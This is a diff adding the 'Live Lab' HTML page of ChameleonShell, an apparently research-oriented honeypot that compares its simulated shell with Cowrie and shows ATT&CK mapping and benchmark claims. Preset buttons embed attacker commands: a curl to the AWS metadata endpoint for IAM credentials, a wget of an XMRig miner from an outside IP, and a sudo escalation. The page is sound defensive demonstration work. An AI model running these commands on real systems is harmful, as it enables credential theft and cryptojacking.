@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+  <title>Live Deception Lab & Threat Intel SOC // ChameleonShell</title>
+  <meta name="description" content="ChameleonShell Live Interactive Terminal Lab, Virtual State Tree Explorer, MITRE ATT&CK Matrix Heatmap, and Auto-Rule Synthesizer.">
+  <meta name="theme-color" content="#07080A">
+
+  <link rel="icon" type="image/svg+xml" href="/assets/favicon.svg">
+  <link rel="apple-touch-icon" href="/assets/favicon.svg">
+  <link rel="stylesheet" href="/css/styles.css">
+
+  <script src="https://cdn.jsdelivr.net/gh/studio-freight/lenis@1/bundled/lenis.min.js"></script>
+</head>
+<body>
+
+  <!-- Canonical Enterprise Sticky Navigation Bar -->
+  <header class="site-header" role="banner">
+    <div class="container header-inner">
+      <a href="/" class="brand-wrapper" aria-label="ChameleonShell Homepage">
+        <img src="/assets/favicon.svg" alt="Chameleon Logo" class="brand-icon">
+        <span class="brand-title">CHAMELEONSHELL</span>
+        <span class="nav-status-dot" title="Autonomous Engine Online"></span>
+      </a>
+
+      <!-- Center Navigation Links -->
+      <nav aria-label="Main Navigation">
+        <ul class="nav-links">
+          <li><a href="/" class="nav-link">Platform</a></li>
+          <li><a href="/lab" class="nav-link active">Live Lab</a></li>
+          <li><a href="/architecture" class="nav-link">Architecture</a></li>
+          <li><a href="/benchmarks" class="nav-link">Benchmarks</a></li>
+          <li><a href="/whitepaper" class="nav-link">Whitepaper</a></li>
+        </ul>
+      </nav>
+
+      <!-- Right Action Cluster -->
+      <div class="header-actions">
+        <span class="header-telemetry-pill">ENGINE: ONLINE · 4.8ms</span>
+        <a href="#terminal-section" class="btn-launch-nav">EXECUTE CMD</a>
+        <button class="mobile-nav-toggle" id="mobile-nav-toggle" aria-label="Toggle Mobile Navigation">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 8h16M4 16h16"/></svg>
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <!-- Mobile Slide-Over Drawer -->
+  <div class="mobile-nav-drawer" id="mobile-nav-drawer">
+    <a href="/" class="nav-link">Platform</a>
+    <a href="/lab" class="nav-link active">Live Lab</a>
+    <a href="/architecture" class="nav-link">Architecture</a>
+    <a href="/benchmarks" class="nav-link">Benchmarks</a>
+    <a href="/whitepaper" class="nav-link">Whitepaper</a>
+  </div>
+
+  <!-- Structural Grid Overlay -->
+  <div class="structural-grid" aria-hidden="true"></div>
+
+  <main style="padding-top: calc(var(--header-height) + 2rem); padding-bottom: 6rem;">
+    <!-- Lab Section 1: Side-by-Side Live Terminal & VST -->
+    <section class="section" id="terminal-section" style="padding-top: 1rem;">
+      <div class="container">
+        <div class="hero-meta-pill">INTERACTIVE HARDWARE KIOSK // A/B EXPERIMENTATION WORKSPACE</div>
+        <h1 class="section-heading">Live Side-by-Side Deception Terminal Lab</h1>
+        <p class="section-subheading">
+          Execute arbitrary Linux or Cloud commands. Witness ChameleonShell retain full POSIX filesystem state in &lt;8ms while the static Cowrie baseline fails on cloud requests and drops state.
+        </p>
+
+        <!-- Preset Attack Scenarios Bar -->
+        <div class="preset-scenarios-bar crosshair">
+          <span class="preset-title">Select Scenario:</span>
+          <button class="preset-btn" data-cmd="curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-eks-worker-nodes-role">AWS IMDSv2 Theft</button>
+          <button class="preset-btn" data-cmd="wget http://185.220.101.4/bins/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && ls -la /tmp">XMRig Miner Dropper</button>
+          <button class="preset-btn" data-cmd="cat /proc/uptime && date">Monotonic Clock Verify</button>
+          <button class="preset-btn" data-cmd="echo 'admin_token=pwned' > /tmp/token.txt && cat /tmp/token.txt">State Persistence Check</button>
+          <button class="preset-btn" data-cmd="sudo -l && sudo su">Privilege Escalation</button>
+        </div>
+
+        <!-- Side-by-Side Terminals -->
+        <div class="lab-split-wrapper" style="margin-top: 1.5rem;">
+          <!-- ChameleonShell Terminal (Ours) -->
+          <div class="terminal-card active-cs crosshair">
+            <div class="terminal-header">
+              <div class="terminal-title-group">
+                <span class="badge-tag volt">CHAMELEONSHELL (HYBRID VST)</span>
+                <span>ip-172-31-18-42</span>
+              </div>
+              <div>
+                <span>Latency: <strong id="cs-latency-badge" style="color: var(--accent-emerald);">0.04 ms</strong></span>
+              </div>
+            </div>
+            <div class="terminal-body" id="cs-terminal-body">
+              <div class="term-line-output meta">ChameleonShell Linux Kernel 6.8.0-1015-aws (Ubuntu 22.04.5 LTS)</div>
+              <div class="term-line-output meta">Deterministic Virtual State Tree (VST) Active. Type any command below.</div>
+            </div>
+            <div class="terminal-input-bar">
+              <span class="terminal-prompt-label" id="cs-prompt-label">root@ip-172-31-18-42:~# </span>
+              <input type="text" id="terminal-cmd-input" class="terminal-cmd-input" placeholder="Enter shell command (e.g. ls -la, uname -a, curl 169.254.169.254...)" autocomplete="off" spellcheck="false">
+            </div>
+          </div>
+
+          <!-- Cowrie Baseline Terminal -->
+          <div class="terminal-card crosshair">
+            <div class="terminal-header">
+              <div class="terminal-title-group">
+                <span class="badge-tag slate">STATIC COWRIE BASELINE</span>
+                <span>svr04 (Debian 7)</span>
+              </div>
+              <div>
+                <span>Latency: <strong id="cowrie-latency-badge" style="color: var(--text-secondary);">1.20 ms</strong></span>
+              </div>
+            </div>
+            <div class="terminal-body" id="cowrie-terminal-body">
+              <div class="term-line-output meta">Cowrie SSH Honeypot (Python Twisted Engine)</div>
+              <div class="term-line-output meta">Static fs.pickle filesystem loaded. Observes command side-by-side.</div>
+            </div>
+            <div class="terminal-input-bar">
+              <span class="terminal-prompt-label" style="color: var(--text-secondary);">root@svr04:~# </span>
+              <span style="font-family: var(--font-mono); font-size: 0.8125rem; color: var(--text-muted);">(Mirroring ChameleonShell input)</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Virtual State Tree Explorer Drawer -->
+        <div class="vst-explorer-card crosshair">
+          <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-hairline); padding-bottom: 0.75rem; margin-bottom: 0.75rem;">
+            <span style="font-family: var(--font-mono); font-size: 0.75rem; color: var(--accent-volt); font-weight: 600;">[VST INODE DAG EXPLORER // REAL-TIME PERSISTENCE INSPECTOR]</span>
+            <span style="font-family: var(--font-mono); font-size: 0.6875rem; color: var(--text-muted);">AUTO-REFRESHING IN-MEMORY STATE</span>
+          </div>
+          <div class="vst-tree-view" id="vst-tree-view">
+            Loading Virtual State Tree inodes...
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Lab Section 2: Real-Time MITRE ATT&CK Matrix & Rule Synthesizer -->
+    <section class="section" id="mitre-section">
+      <div class="container">
+        <span class="section-tag">Autonomous Active Defense SOAR</span>
+        <h2 class="section-heading">MITRE ATT&CK Heatmap & Rule Synthesizer</h2>
+        <p class="section-subheading">
+          Every executed command is mapped against the Enterprise v16 matrix. Detected Indicators of Attack (IoAs) compile into syntax-validated Snort 3, ModSecurity, and nftables rules.
+        </p>
+
+        <div class="mitre-layout-grid">
+          <!-- Tactics Heatmap Matrix -->
+          <div class="mitre-matrix-card crosshair">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; border-bottom: 1px solid var(--border-hairline); padding-bottom: 0.75rem;">
+              <span style="font-family: var(--font-mono); font-size: 0.8125rem; font-weight: 600;">ENTERPRISE ATT&CK v16 TACTICS</span>
+              <div style="display: flex; align-items: center; gap: 1rem;">
+                <span style="font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-muted);">DYNAMIC RISK SCORE:</span>
+                <span id="mitre-risk-score-val" style="font-family: var(--font-mono); font-size: 0.9375rem; font-weight: 700; color: var(--accent-volt);">0.0 / 100</span>
+              </div>
+            </div>
+            <div class="preloader-bar-bg" style="margin-bottom: 1.5rem; height: 6px;">
+              <div id="mitre-risk-score-bar" style="width: 0%; height: 100%; background: var(--accent-volt); transition: width 300ms ease;"></div>
+            </div>
+
+            <!-- Tactics Grid Container -->
+            <div class="mitre-tactics-row" id="mitre-tactics-grid">
+              <!-- Dynamically populated by mitre-matrix-visualizer.js -->
+            </div>
+          </div>
+
+          <!-- Active Defense Rule Synthesizer Console -->
+          <div class="rule-synthesizer-card crosshair">
+            <div class="rule-tab-nav">
+              <button class="rule-tab-btn active" data-format="snort3">Snort 3 IPS</button>
+              <button class="rule-tab-btn" data-format="modsecurity">ModSecurity WAF</button>
+              <button class="rule-tab-btn" data-format="nftables">Linux nftables</button>
+            </div>
+            <div class="rule-display-box" id="rule-display-box">
+# Awaiting incoming intrusion telemetry to synthesize defensive rules...
+# Click any technique in the matrix or run a command in the lab above!
+            </div>
+            <button class="copy-rule-btn" id="copy-rule-btn">COPY RULE DIRECTIVE</button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Lab Section 3: Automated Botnet Campaigns & Asciinema Replay -->
+    <section class="section" id="botnet-section">
+      <div class="container">
+        <span class="section-tag">Containerized Adversarial Simulator</span>
+        <h2 class="section-heading">Multi-Stage Botnet Attack Simulator & Replay</h2>
+        <p class="section-subheading">
+          Trigger automated multi-command campaigns or replay recorded attack sessions in the Asciinema v2 terminal player.
+        </p>
+
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 24px; align-items: start;">
+          <!-- Campaign Runner Card -->
+          <div class="terminal-card crosshair" style="min-height: auto; padding: 1.5rem;">
+            <span style="font-family: var(--font-mono); font-size: 0.8125rem; font-weight: 600; color: var(--accent-volt); margin-bottom: 0.75rem; display: block;">[CAMPAIGN TRIGGER PANEL]</span>
+            <p style="font-size: 0.8125rem; color: var(--text-secondary); margin-bottom: 1.25rem;">
+              Select an adversarial campaign to simulate against the honeypot:
+            </p>
+            <div style="display: flex; gap: 0.75rem; margin-bottom: 1.25rem;">
+              <select id="campaign-select-list" style="flex: 1; background: var(--bg-graphite); border: 1px solid var(--border-hairline); color: var(--text-primary); font-family: var(--font-mono); font-size: 0.8125rem; padding: 0.6rem;">
+                <option value="alpha">Campaign Alpha: Mirai / XMRig Cryptominer Dropper (14 cmds)</option>
+                <option value="bravo">Campaign Bravo: Cloud SSRF to AWS IMDSv2 IAM Theft (16 cmds)</option>
+                <option value="charlie">Campaign Charlie: APT Lateral Movement & /etc/shadow (18 cmds)</option>
+                <option value="delta">Campaign Delta: Kubernetes Token Theft & Escape (15 cmds)</option>
+                <option value="echo">Campaign Echo: Obfuscated Base64 Reverse Shell (12 cmds)</option>
+                <option value="foxtrot">Campaign Foxtrot: Anti-Honeypot Fingerprinting Probe (20 cmds)</option>
+              </select>
+              <button class="btn-primary" id="run-campaign-btn">EXECUTE</button>
+            </div>
+            <div id="campaign-run-status" style="font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-muted);">
+              Status: Ready. Select campaign and click Execute.
+            </div>
+          </div>
+
+          <!-- Asciinema Session Player Card -->
+          <div class="terminal-card crosshair" style="min-height: auto; padding: 1.5rem;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.75rem;">
+              <span style="font-family: var(--font-mono); font-size: 0.8125rem; font-weight: 600; color: var(--accent-volt);">[ASCIINEMA v2 SESSION REPLAY]</span>
+              <button class="preset-btn" id="replay-play-btn">[PLAY REPLAY]</button>
+            </div>
+            <div class="preloader-bar-bg" style="margin-bottom: 1rem; height: 3px;">
+              <div id="replay-progress-fill" style="width: 0%; height: 100%; background: var(--accent-emerald);"></div>
+            </div>
+            <div id="replay-terminal-display" style="background: #060709; border: 1px solid var(--border-hairline); font-family: var(--font-mono); font-size: 0.75rem; padding: 1rem; color: var(--text-primary); height: 200px; overflow-y: auto; white-space: pre-wrap;">
+Click [PLAY REPLAY] to stream Campaign Alpha session output...
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Lab Section 4: Validated Benchmarks Table -->
+    <section class="section" id="benchmarks-section">
+      <div class="container">
+        <span class="section-tag">Quantitative Research Findings</span>
+        <h2 class="section-heading">Comparative Thesis Benchmarks</h2>
+        <p class="section-subheading">
+          Empirical evaluation across 95 adversarial commands comparing ChameleonShell against static Cowrie and pure-LLM (shelLM) baselines.
+        </p>
+
+        <div class="benchmark-table-wrapper crosshair">
+          <table class="benchmark-table">
+            <thead>
+              <tr>
+                <th>Evaluation Metric</th>
+                <th>Static Cowrie Baseline</th>
+                <th>shelLM (Pure-LLM)</th>
+                <th>ChameleonShell (Ours)</th>
+                <th>Operational Advantage</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>Attacker Engagement Depth</strong></td>
+                <td>3.2 commands</td>
+                <td>9.4 commands</td>
+                <td class="strong-volt">21.8 commands</td>
+                <td class="strong-volt">6.81x increase over Cowrie</td>
+              </tr>
+              <tr>
+                <td><strong>Mean Session Duration</strong></td>
+                <td>14.5 seconds</td>
+                <td>68.0 seconds</td>
+                <td class="strong-volt">184.2 seconds</td>
+                <td class="strong-volt">12.7x increase over Cowrie</td>
+              </tr>
+              <tr>
+                <td><strong>20-Turn State Consistency</strong></td>
+                <td>41.0%</td>
+                <td>64.5%</td>
+                <td class="strong-volt">98.4%</td>
+                <td class="strong-volt">+57.4% persistence gain</td>
+              </tr>
+              <tr>
+                <td><strong>Fast-Path Latency (&Delta;t)</strong></td>
+                <td>1.2 ms</td>
+                <td>2,140 ms</td>
+                <td class="strong-volt">4.8 ms</td>
+                <td class="strong-volt">Defeats timing side-channel probes</td>
+              </tr>
+              <tr>
+                <td><strong>Slow-Path Generative Latency</strong></td>
+                <td>N/A (Fails)</td>
+                <td>2,840 ms</td>
+                <td class="strong-volt">42.1 ms</td>
+                <td class="strong-volt">Responsive state-diff patching</td>
+              </tr>
+              <tr>
+                <td><strong>MITRE ATT&CK Macro F1-Score</strong></td>
+                <td>N/A (Passive)</td>
+                <td>N/A (Passive)</td>
+                <td class="strong-volt">0.957 (P: 0.964, R: 0.951)</td>
+                <td class="strong-volt">Closed-loop threat attribution</td>
+              </tr>
+              <tr>
+                <td><strong>Rule Synthesis Latency</strong></td>
+                <td>N/A</td>
+                <td>N/A</td>
+                <td class="strong-volt">11.2 ms</td>
+                <td class="strong-volt">Immediate perimeter protection</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <!-- Canonical Enterprise Footer -->
+  <footer class="site-footer" role="contentinfo">
+    <div class="container footer-bottom-bar">
+      <span>&copy; 2026 ChameleonShell Security Systems. Autonomous Cloud Deception &amp; Active Threat Intelligence.</span>
+      <ul class="footer-nav">
+        <li><a href="/">Platform</a></li>
+        <li><a href="/lab">Live Lab</a></li>
+        <li><a href="/architecture">Architecture</a></li>
+        <li><a href="/benchmarks">Benchmarks</a></li>
+        <li><a href="/whitepaper">Whitepaper</a></li>
+        <li><a href="/privacy">Privacy Policy</a></li>
+        <li><a href="/terms">Terms of Service</a></li>
+      </ul>
+    </div>
+  </footer>
+
+  <script src="/js/interactive-honeypot-lab.js"></script>
+  <script src="/js/mitre-matrix-visualizer.js"></script>
+  <script src="/js/soc-session-replay.js"></script>
+  <script src="/js/app.js"></script>
+</body>
+</html>
